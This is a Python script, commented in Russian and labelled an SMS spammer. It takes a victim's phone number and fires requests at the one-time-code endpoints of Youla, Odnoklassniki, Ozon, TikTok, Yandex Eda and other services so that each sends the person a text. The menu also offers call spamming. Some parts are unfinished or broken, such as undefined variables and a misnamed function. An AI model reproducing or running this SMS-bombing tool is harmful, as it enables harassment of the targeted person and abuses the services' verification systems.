#Не Забудь его доработать
import requests
import time
#СМС СПАММЕР
def Soobsh():
    phone = str(input('Введите номер телефона: '))
    try:
       requests.post("https://youla.ru/web-api/auth/request_code", data={"phone":phone})
       print("Сообщение ЮЛА отправлено")
    except:
       print("Сообщение ЮЛА не отправлено")
       pass
    try:
	    requests.post("https://ok.ru/web-api/auth/request_code", data={"phone":phone})
	    print("Сообщение Одноклассники отправлено")
    except:
        print("Сообщение Одноклассники не отправлено")
        pass
    try:
        requests.post("https://lk.tabris.ru/register/", data={"phone":phone})
        print("Сообщение Табрис отправлено")
    except:
        print("Сообщение Табрис не отправлено")
        pass
    try:
        requests.get("https://www.sportmaster.ru/", params={"module": "users", "action": "SendSMSReg", "phone": phone})
        print("Сообщение СпортМастер отправлено")
    except:
        print("Сообщение СпортМастер не отправлено")
        pass
    try:
        requests.get("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + phone}, headers=headers, proxies=proxies)
        print("Сообщение лента отправлено")
    except:
        print("Сообщение Лента не отправлено")
        pass
    try:
        requests.get("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})
        print("Сообщение Яндекс Еда отправлено")
    except:
        print("Сообщение Яндекс Еда не отправлено")
        pass
    try:
        requests.get("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone,"page":{"pageName":"home","launchMode":"direct","trafficType":""}})
        print("Сообщение Тик Ток Отправлено")
    except:
        print("Сообщение Тик Ток не отправлено")
        pass
    try:
      requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": phone, "otpId": 0})
      print("Сообщение Озон Отправлено")
    except:
      print("Сообщение озон не отправлено")
      pass

#Логотип
def Logo():
 print(r"░██████╗██████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░███╗░░██╗██╗░░░██╗███╗░░░███╗░░███╗░░")
 print(r"██╔════╝██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗████╗░██║██║░░░██║████╗░████║░████║░░")
 print(r"╚█████╗░██████╔╝███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝██╔██╗██║██║░░░██║██╔████╔██║██╔██║░░")
 print(r"░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗██║╚████║██║░░░██║██║╚██╔╝██║╚═╝██║░░")
 print(r"██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║██║░╚███║╚██████╔╝██║░╚═╝░██║███████╗")


#Основное меню
def Main():
 Logo()
 print("1. СМС СПАММЕР")
 print("2. СПАММ ЗВОНКАМИ")
 print("3. СПАМ ЗВОНКАМИ И СМС (Mix)")
 print("4. ВЫХОД")
 choice = input("Введите номер:")
 if choice == "4":
    print("До связи")
    exit()
 elif choice == "1":
     Soobsh()
 else:
    print("Номер введен неверно!")
    sleep(1)
    main()





Main()
